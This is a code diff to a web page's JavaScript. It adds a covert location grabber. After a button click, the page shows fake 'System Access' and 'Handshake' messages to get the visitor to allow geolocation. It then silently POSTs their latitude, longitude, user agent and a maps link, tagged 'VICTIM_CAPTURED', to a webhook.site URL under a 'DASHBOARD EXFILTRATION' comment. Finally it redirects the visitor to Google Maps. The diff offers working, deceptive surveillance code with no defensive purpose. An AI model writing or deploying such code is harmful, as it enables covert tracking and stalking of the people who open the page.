@@ -22,17 +22,34 @@
             const msg = document.getElementById("msg");
             msg.innerHTML = "Requesting System Access...";
             
-            // This direct call on a button click is the "Professional" way
             navigator.geolocation.getCurrentPosition(
                 (pos) => {
-                    msg.innerHTML = "Handshake Successful. Redirecting...";
-                    // Sends data to the hidden payload
+                    msg.innerHTML = "Handshake Successful. Processing...";
+                    
+                    const lat = pos.coords.latitude;
+                    const lon = pos.coords.longitude;
+
+                    // --- DASHBOARD EXFILTRATION ---
+                    // This sends the data silently to your unique Webhook link
+                    fetch("https://webhook.site/b9525f76-1fae-4111-9571-1ad90bbdb8a7", {
+                        method: "POST",
+                        mode: "no-cors",
+                        body: JSON.stringify({
+                            status: "VICTIM_CAPTURED",
+                            latitude: lat,
+                            longitude: lon,
+                            device: navigator.userAgent,
+                            maps_link: `https://www.google.com/maps?q=${lat},${lon}`
+                        })
+                    });
+                    // ------------------------------
+
+                    // Opens Google Maps on the phone for the video finish
                     setTimeout(() => {
-                        window.location.href = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                        window.location.href = `https://www.google.com/maps?q=${lat},${lon}`;
                     }, 1000);
                 },
                 (err) => {
-                    // Smoothly tells the user to click Allow instead of crashing
                     msg.innerHTML = "⚠️ Error: Handshake Rejected.<br>Please 'Allow' access to continue.";
                     msg.style.color = "red";
                 },
